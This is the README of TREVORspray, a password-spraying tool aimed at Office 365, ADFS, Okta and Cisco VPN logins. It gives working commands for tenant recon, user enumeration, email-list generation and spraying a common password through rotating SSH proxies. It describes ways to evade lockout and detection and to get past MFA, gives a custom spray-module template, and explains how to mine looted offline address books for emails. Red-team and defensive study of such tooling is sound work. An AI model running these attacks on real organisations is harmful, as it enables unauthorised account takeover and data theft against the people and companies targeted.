# TREVORspray 2.0
TREVORspray is a modular password sprayer with threading, SSH proxying, loot modules, and more!

By [@thetechr0mancer](https://twitter.com/thetechr0mancer)

[![License](https://img.shields.io/badge/license-GPLv3-blue.svg)](https://raw.githubusercontent.com/blacklanternsecurity/nmappalyzer/master/LICENSE)
[![Python Version](https://img.shields.io/badge/python-3.6+-blue)](https://www.python.org)

## Installation:
~~~bash
pip install git+https://github.com/blacklanternsecurity/trevorproxy
pip install git+https://github.com/blacklanternsecurity/trevorspray
~~~

See the accompanying [**Blog Post**](blogpost.md) for a fun rant and some cool demos!

![trevorspray-demo](https://user-images.githubusercontent.com/20261699/149219712-8549e15c-2eee-4d7a-a615-e8882b693c3f.gif)

## Features
- Threads, lots of threads
- Multiple modules
  - `msol` (Office 365)
  - `adfs` (Active Directory Federation Services)
  - `okta` (Okta SSO)
  - `anyconnect` (Cisco VPN)
  - custom modules (easy to make!)
- Tells you the status of each account: if it exists, is locked, has MFA enabled, etc.
- Automatic cancel/resume (remembers already-tried user/pass combos in `~/.trevorspray/tried_logins.txt`)
- Round-robin proxy through multiple IPs with `--ssh` or `--subnet`
- Automatic infinite reconnect/retry if a proxy goes down (or if you lose internet)
- Spoofs `User-Agent` and other signatures to look like legitimate auth traffic
- Comprehensive logging
- Optional `--delay`, `--jitter`, and `--lockout-delay` between requests to bypass lockout countermeasures
- IPv6 support
- O365 MFA bypass support (disable with `--no-loot`)
  - IMAP
  - SMTP
  - POP
  - EWS (Exchange Web Services) - Automatically retrieves GAL (Global Address Book)
  - EAS (Exchange ActiveSync)
  - EXO (Exchange Online PowerShell)
  - UM (Exchange Unified Messaging)
  - AutoDiscover - Automatically retrieves OAB (Offline Address Book)
  - Azure Portal Access
- Domain `--recon` with the following features:
  - list MX/TXT records
  - list O365 info
    - tenant ID
    - tenant name
    - other tentant domains
    - sharepoint URL
    - authentication urls, autodiscover, federation config, etc.
  - enumerate valid users via OneDrive without attempting logins (use `--recon` and `--users`)

## How To - O365
- First, get a list of emails for `corp.com` and perform a spray to see if the default configuration works. Usually it does.
- If TREVORspray says the emails in your list don't exist, don't give up. Get the `token_endpoint` with `--recon corp.com`. The `token_endpoint` is the URL you'll be spraying against (with the `--url` option).
- It may take some experimentation before you find the right combination of `token_endpoint` + email format.
    - For example, if you're attacking `corp.com`, it may not be as easy as spraying `corp.com`. You may find that Corp's parent company Evilcorp owns their Azure tenant, meaning that you need to spray against `evilcorp.com`'s `token_endpoint`. Also, you may find that `corp.com`'s internal domain `corp.local` is used instead of `corp.com`.
    - So in the end, instead of spraying `bob@corp.com` against `corp.com`'s `token_endpoint`, you're spraying `bob@corp.local` against `evilcorp.com`'s.

## Example: Perform recon against a domain (retrieves tenant info, autodiscover, mx records, etc.)
```bash
trevorspray --recon evilcorp.com
...
    "token_endpoint": "https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token"
...
```

## Example: Enumerate users via OneDrive (no failed logins)
```bash
trevorspray --recon evilcorp.com -u emails.txt --threads 10
```

![recon-user-enumeration](https://user-images.githubusercontent.com/20261699/151052308-d938bf6c-f335-4d3e-9c3c-1fd79a188e73.gif)

## Example: Spray against discovered "token_endpoint" URL
```bash
trevorspray -u emails.txt -p 'Welcome123' --url https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token
```

## Example: Spray with 5-second delay between requests
```bash
trevorspray -u bob@evilcorp.com -p 'Welcome123' --delay 5
```

## Example: Spray and round-robin between 3 IPs (the current IP is also used, unless `-n` is specified)
```bash
trevorspray -u emails.txt -p 'Welcome123' --ssh root@1.2.3.4 root@4.3.2.1
```

## Example: Find valid usernames without OSINT >:D
```bash
# clone wordsmith dataset
wget https://github.com/skahwah/wordsmith/releases/download/v2.1.1/data.tar.xz && tar -xvf data.tar.xz && cd data

# order first initial by occurrence
ordered_letters=asjmkdtclrebnghzpyivfowqux

# loop through first initials
echo -n $ordered_letters | while read -n1 f; do
  # loop through top 2000 USA last names
  head -n 2000 'usa/lnames.txt' | while read last; do
    # generate emails in f.last format
    echo "${f}.${last}@evilcorp.com"
  done
done | tee f.last.txt

trevorspray -u f.last.txt -p 'Welcome123'
```

## Extract data from downloaded LZX files
When TREVORspray successfully bypasses MFA and retrieves an Offline Address Book (OAB), the address book is downloaded in LZX format to `~/.trevorspray/loot`. LZX is an ancient and obnoxious compression algorithm used by Microsoft.
~~~bash
# get libmspack (for extracting LZX file)
git clone https://github.com/kyz/libmspack
cd libmspack/libmspack/
./rebuild.sh
./configure
make

# extract LZX file
./examples/.libs/oabextract ~/.trevorspray/loot/deadbeef-ce01-4ec9-9d08-1050bdc41131-data-1.lzx oab.bin
# extract all strings
strings oab.bin
# extract and dedupe emails
egrep -oa '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}' oab.bin | tr '[:upper:]' '[:lower:]' | sort -u
~~~

## TREVORspray - Help:
```
$ trevorspray --help
usage: trevorspray [-h] [-u USERS [USERS ...]] [-p PASSWORDS [PASSWORDS ...]] [--url URL] [-t THREADS]
                   [-r DOMAIN [DOMAIN ...]] [-f] [-d DELAY] [-ld LOCKOUT_DELAY] [-j JITTER] [-e] [-nl] [--timeout TIMEOUT]
                   [--random-useragent] [-m {okta,anyconnect,adfs,msol}] [-6] [--proxy PROXY] [-v]
                   [-s USER@SERVER [USER@SERVER ...]] [-i KEY] [-b BASE_PORT] [-n] [--interface INTERFACE] [--subnet SUBNET]

A password sprayer with the option to load-balance traffic through SSH hosts

optional arguments:
  -h, --help            show this help message and exit
  -m {okta,anyconnect,adfs,msol}, --module {okta,anyconnect,adfs,msol}
                        Spray module to use (default: msol)
  -u USERS [USERS ...], --users USERS [USERS ...]
                        Usernames(s) and/or file(s) containing usernames
  -p PASSWORDS [PASSWORDS ...], --passwords PASSWORDS [PASSWORDS ...]
                        Password(s) that will be used to perform the password spray
  --url URL             The URL to spray against
  -t THREADS, --threads THREADS
                        Max number of concurrent requests (default: 1)
  -r DOMAIN [DOMAIN ...], --recon DOMAIN [DOMAIN ...]
                        Retrieves MX records and info related to authentication, email, Azure, Microsoft 365, etc.
  -f, --force           Forces the spray to continue and not stop when multiple account lockouts are detected
  -d DELAY, --delay DELAY
                        Sleep for this many seconds between requests
  -ld LOCKOUT_DELAY, --lockout-delay LOCKOUT_DELAY
                        Sleep for this many additional seconds when a lockout is encountered
  -j JITTER, --jitter JITTER
                        Add a random delay of up to this many seconds between requests
  -e, --exit-on-success
                        Stop spray when a valid cred is found
  -nl, --no-loot        Don't execute loot activites for valid accounts
  --timeout TIMEOUT     Connection timeout in seconds (default: 10)
  --random-useragent    Add a random value to the User-Agent for each request
  -6, --prefer-ipv6     Prefer IPv6 over IPv4
  --proxy PROXY         Proxy to use for HTTP and HTTPS requests
  -v, --verbose, --debug
                        Show which proxy is being used for each request

SSH Proxy:
  Round-robin traffic through remote systems via SSH (overrides --threads)

  -s USER@SERVER [USER@SERVER ...], --ssh USER@SERVER [USER@SERVER ...]
                        Round-robin load-balance through these SSH hosts (user@host) NOTE: Current IP address is also used
                        once per round
  -i KEY, -k KEY, --key KEY
                        Use this SSH key when connecting to proxy hosts
  -b BASE_PORT, --base-port BASE_PORT
                        Base listening port to use for SOCKS proxies
  -n, --no-current-ip   Don't spray from the current IP, only use SSH proxies

Subnet Proxy:
  Send traffic from random addresses within IP subnet

  --interface INTERFACE
                        Interface to send packets on
  --subnet SUBNET       Subnet to send packets from
```

## Writing your own Spray Modules
If you need to spray a service/endpoint that's not supported yet, you can write your own spray module! This is a great option because custom modules benefit from all of TREVORspray's features -- e.g. proxies, delay, jitter, etc.

Writing your own spray module is pretty straightforward. Create a new `.py` file in `lib/sprayers` (e.g. `lib/sprayers/custom_sprayer.py`), and create a class that inherits from `BaseSprayModule`. You can call the class whatever you want. Fill out the HTTP method and any other parameters that you need in the requests (you can reference `lib/sprayers/base.py` or any of the other modules for examples).
  - You only need to implement one method on your custom class: `check_response()`. This method evaluates the HTTP response to determine whether the login was successful.
  - Once you're finished, you can use the custom spray module by specifying the name of your python file (without the `.py`) on the command line, e.g. `trevorspray -m custom_sprayer -u users.txt -p Welcome123`.
~~~python
# Example spray module

from .base import BaseSprayModule

class SprayModule(BaseSprayModule):

    # HTTP method
    method = 'POST'
    # default target URL
    default_url = 'https://login.evilcorp.com/'
    # body of request
    request_data = 'user={username}&pass={password}&group={otherthing}'
    # HTTP headers
    headers = {}
    # HTTP cookies
    cookies = {}
    # Don't count nonexistent accounts as failed logons
    fail_nonexistent = False

    headers = {
        'User-Agent': 'Your Moms Smart Vibrator',
    }

    def initialize(self):
        '''
        Get additional arguments from user at runtime
        NOTE: These can also be passed via environment variables beginning with "TREVOR_":
            TREVOR_otherthing=asdf
        '''
        while not self.trevor.runtimeparams.get('otherthing', ''):
            self.trevor.runtimeparams.update({
                'otherthing': input("What's that other thing? ")
            })

        return True


    def check_response(self, response):
        '''
        returns (valid, exists, locked, msg)
        '''

        valid = False
        exists = None
        locked = None
        msg = ''

        if getattr(response, 'status_code', 0) == 200:
            valid = True
            exists = True
            msg = 'Valid cred'

        return (valid, exists, locked, msg)
~~~

CREDIT WHERE CREDIT IS DUE - MANY THANKS TO:
- [@dafthack](https://twitter.com/dafthack) for writing [MSOLSpray](https://github.com/dafthack/MSOLSpray)
- [@Mrtn9](https://twitter.com/Mrtn9) for his Python port of [MSOLSpray](https://github.com/MartinIngesen/MSOLSpray)
- [@KnappySqwurl](https://twitter.com/KnappySqwurl) for being a splunk wizard
- [@CarsonSallis](https://github.com/CarsonSallis) for the O365 MFA bypasses
- [@DrAzureAD](https://twitter.com/DrAzureAD) for the Azure AD recon features ([AADInternals](https://github.com/Gerenios/AADInternals))
- [@nyxgeek](https://twitter.com/nyxgeek) for the OneDrive user enumeration ([onedrive_user_enum](https://github.com/nyxgeek/onedrive_user_enum))

![trevor](https://user-images.githubusercontent.com/20261699/92336575-27071380-f070-11ea-8dd4-5ba42c7d04b7.jpeg)

`#trevorforget`